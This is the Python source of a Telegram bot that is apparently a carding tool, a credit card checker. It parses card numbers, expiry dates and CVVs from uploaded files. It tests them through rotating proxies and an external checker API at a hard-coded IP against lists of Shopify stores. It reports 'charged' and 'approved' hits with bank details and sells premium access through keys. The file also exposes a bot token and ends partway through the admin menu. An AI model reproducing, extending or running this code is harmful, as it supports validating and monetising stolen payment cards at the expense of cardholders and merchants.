from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime, timedelta

API_ID = 105
API_HASH = '38545ba6'
BOT_TOKEN = "8250378472:AAFH_JgQVbOUnCUvYQaOnLMnrWi4G_MCDZY"
ADMIN_ID = [6936293942]
CHECKER_API_URL = 'http://85.90.216.140//shopify_parallel'


PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
PRICE_FILTERS_FILE = "price_filters.json"
SITES_WITH_PRICE_FILE = "sites_price.json"
KEYS_FILE = "keys.json"
HITS_CHANNEL_ID = 0

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}
TEMP_FILE_DATA = {}
SHOPIFY_SESSION_RESULTS = {}

PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5120722716260828125", "⭐️": "5172716095697584957",
    "🆓": "5406756500108501710", "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5445408306669582934", "🥰": "5444931419270839381", "😱": "5447181973544008180",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958",
      "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798",
    "⛔️": "5275969776668134187", "🥲": "4904468402782864209",
    "☠️": "5231338559587257737", "🛡": "5219672809936006424",
    "📸": "5445344161333015312", "💬": "5447510826304959724",
    "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110",
    "📡": "5447448489149625830", "🌟": "5310224206732996002",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
    "😇": "6321225560789877992", "👌": "5445350109862720603",
    "⭐": "6267298050205553492", "🍭": "6267152480878990865",
    "⚙️": "5258023599419171861", "⛔": "4918014360267260850",


}

DEFAULT_FILTERS = [
    {"name": "0~10", "min": 0, "max": 10},
    {"name": "10~50", "min": 10, "max": 50},
    {"name": "50~200", "min": 50, "max": 200},
    {"name": "200~ & ", "min": 200, "max": 999999},
    {"name": "Aʟʟ Sɪᴛᴇs", "min": 0, "max": 999999, "all": True}
]

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" Cᴍᴅ", b"show_cmds", style="success", icon=4904936030232117798),
         Button.url(" Cʜᴀɴɴᴇʟ", "https://t.me/netdz02_dev", style="success", icon=5445408306669582934)]
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" Aᴅᴍɪɴ Pᴀɴᴇʟ", b"admin_panel", style="success", icon=6266995104687330978)])
    return buttons

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        with open(PREMIUM_USERS_FILE, 'w') as f:
            for admin in ADMIN_ID:
                f.write(f"{admin}\n")
        return [str(admin) for admin in ADMIN_ID]
    try:
        with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        for admin in ADMIN_ID:
            if str(admin) not in users:
                users.append(str(admin))
                with open(PREMIUM_USERS_FILE, 'w') as f:
                    for u in users:
                        f.write(f"{u}\n")
        return users
    except:
        return [str(admin) for admin in ADMIN_ID]

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    premium_users = load_premium_users()
    return str(user_id) in premium_users

async def add_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) not in premium_users:
        premium_users.append(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                await f.write(f"{uid}\n")
        return True
    return False

async def remove_premium_user(user_id):
    premium_users = load_premium_users()
    if str(user_id) in premium_users:
        premium_users.remove(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                await f.write(f"{uid}\n")
        return True
    return False

def generate_key():
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))
    return f"YACINE_{random_part}"

async def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys, f, indent=4)

async def load_price_filters():
    if not os.path.exists(PRICE_FILTERS_FILE):
        return {}
    try:
        with open(PRICE_FILTERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_price_filters(filters):
    with open(PRICE_FILTERS_FILE, 'w') as f:
        json.dump(filters, f, indent=4)

async def load_sites_with_price():
    if not os.path.exists(SITES_WITH_PRICE_FILE):
        return []
    try:
        with open(SITES_WITH_PRICE_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

async def save_sites_with_price(data):
    with open(SITES_WITH_PRICE_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def get_price_from_response(raw_response):
    try:
        price = raw_response.get('Price', '-')
        if price != '-' and price != 0:
            try:
                price_clean = str(price).replace('$', '').replace(',', '').strip()
                return float(price_clean)
            except:
                return 0.0
        return 0.0
    except:
        return 0.0

def is_site_dead(response_msg, gateway, price):
    if not response_msg:
        return True
    if not gateway or gateway == "Unknown":
        return True
    if "Shopify" not in gateway:
        return True
    price_str = str(price)
    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
        return True
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
                except:
                    return '-', '-', '-', '-', '-', ''
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def send_hit_to_channel(card, status, response, gateway, price):
    if HITS_CHANNEL_ID == 0:
        return
    try:
        if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
            status_text = premium_emoji("💎 Cʜᴀʀɢᴇᴅ")
            should_pin = True
        elif "APPROVED" in status.upper():
            status_text = premium_emoji("✅ Aᴘᴘʀᴏᴠᴇᴅ")
            should_pin = False
        else:
            status_text = premium_emoji(f"📌 {status}")
            should_pin = False
        now = datetime.now()
        time_str = now.strftime("%H:%M:%S")
        msg = premium_emoji(f"""{status_text}
🛒 Gᴀᴛᴇᴡᴀʏ {gateway}
📝 {response[:45]}
⏱️ {time_str}
🍑 <a href='tg://user?id=8978049174'>Aꜰᴜᴏɴᴀ</a>""")
        sent_msg = await bot.send_message(abs(HITS_CHANNEL_ID), msg, parse_mode='html')
        if should_pin:
            try:
                await bot.pin_message(abs(HITS_CHANNEL_ID), sent_msg.id)
            except:
                pass
    except:
        pass

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
            else:
                proxy_str = proxy
        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                try:
                    raw = await resp.json()
                except:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        price_value = get_price_from_response(raw)
        if price != '-' and price != 0:
            price_display = f"${price}"
        else:
            price_display = '-'
        gateway = raw.get('Gateway', 'Shopify')
        if is_site_dead(response_msg, gateway, price_display):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        response_lower = response_msg.lower()
        if 'charged' in response_lower or 'order_placed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        elif any(key in response_lower for key in ['approved', 'success', 'insufficient_funds', 'insufficient funds', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc', 'incorrect_zip', 'incorrect zip', 'cvv issue', '3d', '3d secure', 'otp', 'verification required', 'authenticate', 'authentication required', 'challenge required', 'redirecting to bank', 'bank verification', 'send code', 'enter code', 'verify']):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)
        if not result.get('retry'):
            return result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}

async def test_site_with_price(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead', 'price': 0.0}
                try:
                    raw = await resp.json()
                except:
                    return {'site': site, 'status': 'dead', 'price': 0.0}
        response_msg = raw.get('Response', '')
        gateway = raw.get('Gateway', '')
        price_display = raw.get('Price', '-')
        price_value = get_price_from_response(raw)
        if is_site_dead(response_msg, gateway, price_display):
            return {'site': site, 'status': 'dead', 'price': 0.0}
        else:
            return {'site': site, 'status': 'alive', 'price': price_value}
    except:
        return {'site': site, 'status': 'dead', 'price': 0.0}

async def test_proxy(proxy):
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            proxy_url = f'http://{proxy}'
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('https://www.shopify.com', proxy=proxy_url) as res:
                if res.status == 200:
                    return {'proxy': proxy, 'status': 'alive'}
                else:
                    return {'proxy': proxy, 'status': 'dead'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

async def send_realtime_hit(user_id, result, hit_type, username):
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    if hit_type == "Charged":
        status_text = "CHARGED"
        emoji = "💎"
    else:
        status_text = "APPROVED"
        emoji = "✅"
    message = f"""{status_text}

💳 CC <code>{result['card']}</code>

🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}

🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}"""
    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    total = results['total']
    checked = results['checked']
    remaining = total - checked
    
    percentage = int((checked / total) * 100) if total > 0 else 0
    
    bar_length = 16
    filled = int(bar_length * checked / total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_length - filled)
    
    progress_text = f"""💳 Cᴀʀᴅ: <code>{results.get('last_card', 'None')[:16]}</code>
📝 {results.get('last_response', 'Waiting...')[:16]}
💰 {results.get('last_price', '-')[:7]}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
{bar}
📊 {checked}/{total} ({percentage}%) | Rᴇᴍᴀɪɴɪɴɢ: {remaining}
⏱️ {hours:02d}:{minutes:02d}:{seconds:02d}
"""
    buttons = [
        [Button.inline(f" Cʜᴀʀɢᴇᴅ {len(results['charged'])}", f"shopify_export_charged:{user_id}".encode(), style="success", icon=5343636681473935403)],
        [Button.inline(f" Aᴘᴘʀᴏᴠᴇᴅ {len(results['approved'])}", f"shopify_export_approved:{user_id}".encode(), style="primary", icon=5123248930124989216)],
        [Button.inline(" Sᴛᴏᴘ", f"stop_{user_id}".encode(), style="danger", icon=4904934320835134291)]
    ]
    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "Nᴏ ʜɪᴛs ғᴏᴜɴᴅ"
    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    summary = f"""✅ Cʜᴇᴄᴋ Cᴏᴍᴘʟᴇᴛᴇ! ✅

📊 Rᴇsᴜʟᴛs:
   ┣ ✅ Cʜᴀʀɢᴇᴅ: {len(results['charged'])}
   ┣ 🔥 Aᴘᴘʀᴏᴠᴇᴅ: {len(results['approved'])}
   ┣ ❌ Dᴇᴄʟɪɴᴇᴅ: {len(results['dead'])}
   ┗ 📊 Tᴏᴛᴀʟ: {results['total']}

Hɪᴛs:
{hits_text}

💡 Mᴀᴅᴇ ʙʏ @yacine_X6"""
    
    buttons = []
    if results['charged']:
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Cʜᴀʀɢᴇᴅ ({len(results['charged'])})", f"shopify_export_charged:{user_id}".encode(), style="success", icon=5343636681473935403)])
    if results['approved']:
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Aᴘᴘʀᴏᴠᴇᴅ ({len(results['approved'])})", f"shopify_export_approved:{user_id}".encode(), style="primary", icon=5123248930124989216)])
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"afuonax{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("CC CHECKER RESULTS\n")
        await f.write(f"CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"DECLINED ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
    
    await bot.send_message(user_id, premium_emoji(summary), file=filename, buttons=buttons if buttons else None, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

async def process_file_with_filters(event, user_id):
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        if not cards:
            await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ."), parse_mode='html')
            os.remove(file_path)
            return
        TEMP_FILE_DATA[user_id] = {'cards': cards, 'file_path': file_path}
        filters = await load_price_filters()
        gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
        buttons = []
        row = []
        for i, f in enumerate(gateway_filters):
            row.append(Button.inline(f["name"], f"price_fltr:{i}:{user_id}".encode(), style="primary", icon=5348503265967355284))
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        buttons.append([Button.inline("  Cᴀɴᴄᴇʟ", b"cancel_filter", style="danger", icon=5447647474984449520)])
        await event.reply(
            premium_emoji(f"📁 Fɪʟᴇ ʟᴏᴀᴅᴇᴅ: {len(cards)} ᴄᴀʀᴅs ғᴏᴜɴᴅ!\n\n💰 Sᴇʟᴇᴄᴛ ᴀ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ:"),
            buttons=buttons,
            parse_mode='html'
        )
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

async def start_mass_check(user_id, cards, sites, event):
    if not sites:
        await event.edit(premium_emoji("❌ Nᴏ sɪᴛᴇs ᴀᴠᴀɪʟᴀʙʟᴇ!"), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.edit(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ᴀᴠᴀɪʟᴀʙʟᴇ!"), parse_mode='html')
        return
    status_msg = await event.edit(premium_emoji(f"🔥 Sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ ғᴏʀ {len(cards)} ᴄᴀʀᴅs..."), parse_mode='html')
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    all_results = {
        'charged': [], 'approved': [], 'dead': [],
        'total': len(cards), 'checked': 0,
        'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Unknown'
    }
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update_time = [time.time()]
        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                current_sites = sites
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=2)
                all_results['checked'] += 1
                all_results['last_card'] = card
                all_results['last_response'] = res.get('message', '')[:50]
                all_results['last_price'] = res.get('price', '-')
                all_results['last_gateway'] = res.get('gateway', 'Unknown')
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', 'user')
                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'))
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', 'user')
                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'))
                else:
                    all_results['dead'].append(res)
                queue.task_done()
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except:
                            pass
        workers = [asyncio.create_task(worker()) for _ in range(10)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ Aɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, all_results)
        SHOPIFY_SESSION_RESULTS[user_id] = all_results
        await asyncio.sleep(300)
        SHOPIFY_SESSION_RESULTS.pop(user_id, None)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    is_prem = is_premium(user_id)
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    plan = "🆓 Fʀᴇᴇ" if not is_prem else "⭐ Pʀᴇᴍɪᴜᴍ"
    
    sites_data = await load_sites_with_price()
    total_sites = len(sites_data)
    
    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
    
    filter_text = ""
    for f in gateway_filters:
        if f.get('all', False):
            count = total_sites
        else:
            count = len([s for s in sites_data if f['min'] <= s.get('price', 0) < f['max']])
        filter_text += f"   ┣ {f['name']}  {count}\n"
    
    welcome_text = f"""Wᴇʟᴄᴏᴍᴇ @{username}!
👑 Pʟᴀɴ: {plan}
💰 Fɪʟᴛᴇʀs:
{filter_text}

🎁 Hᴏᴡ ᴛᴏ ᴜsᴇ:
   🦉 /addproxy
   🦉 /cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ
   🔑 /redeem Kᴇʏ

💡 Bᴏᴛ Dᴇᴠ @yacine_X6
 Vᴇʀsɪᴏɴ -» 2.0 🚀
 ﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏"""
    
    buttons = get_main_menu_keyboard(user_id)
    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = """📋 Usᴇʀ Cᴏᴍᴍᴀɴᴅs

🛒 Sʜᴏᴘɪғʏ
├─ <code>/cc ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
└─ <code>/chk</code> → Mᴀss ᴄʜᴇᴄᴋ ғʀᴏᴍ .ᴛxᴛ ғɪʟᴇ

🔌 Pʀᴏxʏ Mᴀɴᴀɢᴇᴍᴇɴᴛ
├─ <code>/proxy</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ ᴘʀᴏxɪᴇs
├─ <code>/addproxy</code> → Aᴅᴅ ᴘʀᴏxɪᴇs
├─ <code>/chkproxy ᴘʀᴏxʏ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴘʀᴏxʏ
├─ <code>/rmproxy ᴘʀᴏxʏ</code> → Rᴇᴍᴏᴠᴇ sɪɴɢʟᴇ ᴘʀᴏxʏ
├─ <code>/rmproxyindex 1,2,3</code> → Rᴇᴍᴏᴠᴇ ʙʏ ɪɴᴅᴇx
├─ <code>/clearproxy</code> → Rᴇᴍᴏᴠᴇ ᴀʟʟ ᴘʀᴏxɪᴇs
└─ <code>/getproxy</code> → Gᴇᴛ ᴀʟʟ ᴘʀᴏxɪᴇs

🔑 Kᴇʏ Sʏsᴛᴇᴍ
└─ <code>/redeem Kᴇʏ</code> → Rᴇᴅᴇᴇᴍ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ """
    buttons = [[Button.inline(" Bᴀᴄᴋ", b"main_menu", style="danger", icon=5445365692004071819)]]
    await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ.", alert=True)
        return
    admin_text = """👑 <b>Aᴅᴍɪɴ Pᴀɴᴇʟ</b>

📋 <b>Pʀᴇᴍɪᴜᴍ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/addpremium ᴜsᴇʀ_ɪᴅ</code> → Aᴅᴅ ᴜsᴇʀ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ
├─ <code>/removepremium ᴜsᴇʀ_ɪᴅ</code> → Rᴇᴍᴏᴠᴇ ᴜsᴇʀ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ
├─ <code>/listpremium</code> → Lɪsᴛ ᴀʟʟ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs
└─ <code>/genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ᴜsᴇʀ_ʟɪᴍɪᴛ</code> → Gᴇɴᴇʀᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏs

🌐 <b>Sɪᴛᴇs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/addsites</code> → Rᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ sɪᴛᴇs
├─ <code>/site</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ sɪᴛᴇs
├─ <code>/rm ᴜʀʟ</code> → Rᴇᴍᴏᴠᴇ sᴘᴇᴄɪғɪᴄ sɪᴛᴇ
├─ <code>/getsites</code> → Dᴏᴡɴʟᴏᴀᴅ ᴄᴜʀʀᴇɴᴛ sɪᴛᴇs.ᴛxᴛ
├─ <code>/setfilter shopify_global ᴍɪɴ-ᴍᴀx \"Nᴀᴍᴇ\"</code> → Aᴅᴅ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ
├─ <code>/listfilters</code> → Vɪᴇᴡ ᴀʟʟ ғɪʟᴛᴇʀs
└─ <code>/removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ</code> → Rᴇᴍᴏᴠᴇ ᴀ ғɪʟᴛᴇʀ

📊 <b>Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs</b>
